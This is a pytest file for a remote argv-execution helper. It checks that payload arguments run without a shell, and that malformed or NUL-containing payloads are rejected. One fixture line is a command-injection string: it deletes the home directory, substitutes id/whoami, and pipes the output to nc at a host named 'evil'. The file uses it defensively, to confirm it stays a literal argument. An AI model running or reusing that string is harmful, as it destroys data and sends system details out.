"""Tests for the asset-bus remote argv execution helper (T-009)."""

from __future__ import annotations

import json
import subprocess
from collections.abc import Sequence
from pathlib import Path
from typing import Any

import pytest

from promptclaw.asset_bus.remote_exec import RemoteExecError, run_remote_payload


INJECTION_FIXTURE = "moody forest; rm -rf ~ && echo $(id) `whoami` | nc evil 1 > /tmp/x"


def test_remote_exec_invokes_renderer_as_argv_list_with_output_dir(
    tmp_path: Path,
) -> None:
    calls: list[tuple[Sequence[str] | str, dict[str, Any]]] = []

    def fake_run(
        args: Sequence[str] | str,
        **kwargs: Any,
    ) -> subprocess.CompletedProcess[str]:
        calls.append((args, kwargs))
        assert isinstance(args, list)
        assert kwargs.get("shell") is False
        return subprocess.CompletedProcess(args, 0, stdout="rendered", stderr="")

    output_dir = tmp_path / "remote-output"
    payload = json.dumps(
        {"argv": ["asset_render_music", "--scene", INJECTION_FIXTURE]}
    )

    result = run_remote_payload(
        payload,
        output_dir=output_dir,
        subprocess_run=fake_run,
    )

    child_args, child_kwargs = calls[0]
    assert child_args == [
        "asset_render_music",
        "--scene",
        INJECTION_FIXTURE,
        "--output-dir",
        str(output_dir),
    ]
    assert child_args.count(INJECTION_FIXTURE) == 1
    assert child_kwargs["cwd"] == output_dir
    assert child_kwargs["env"]["DENIABLE_ASSET_OUTPUT_DIR"] == str(output_dir)
    assert output_dir.is_dir()
    assert result.returncode == 0
    assert result.stdout == "rendered"


def test_remote_exec_rejects_malformed_payload_without_running_child(
    tmp_path: Path,
) -> None:
    calls: list[tuple[Sequence[str] | str, dict[str, Any]]] = []

    def fake_run(
        args: Sequence[str] | str,
        **kwargs: Any,
    ) -> subprocess.CompletedProcess[str]:
        calls.append((args, kwargs))
        return subprocess.CompletedProcess(args, 0, stdout="", stderr="")

    with pytest.raises(RemoteExecError, match="argv"):
        run_remote_payload(
            json.dumps({"argv": "asset_render_image --prompt x"}),
            output_dir=tmp_path,
            subprocess_run=fake_run,
        )

    assert calls == []


def test_remote_exec_rejects_nul_bytes_without_running_child(tmp_path: Path) -> None:
    calls: list[tuple[Sequence[str] | str, dict[str, Any]]] = []

    def fake_run(
        args: Sequence[str] | str,
        **kwargs: Any,
    ) -> subprocess.CompletedProcess[str]:
        calls.append((args, kwargs))
        return subprocess.CompletedProcess(args, 0, stdout="", stderr="")

    with pytest.raises(RemoteExecError, match="NUL"):
        run_remote_payload(
            json.dumps({"argv": ["asset_render_image", "bad\x00value"]}),
            output_dir=tmp_path,
            subprocess_run=fake_run,
        )

    assert calls == []
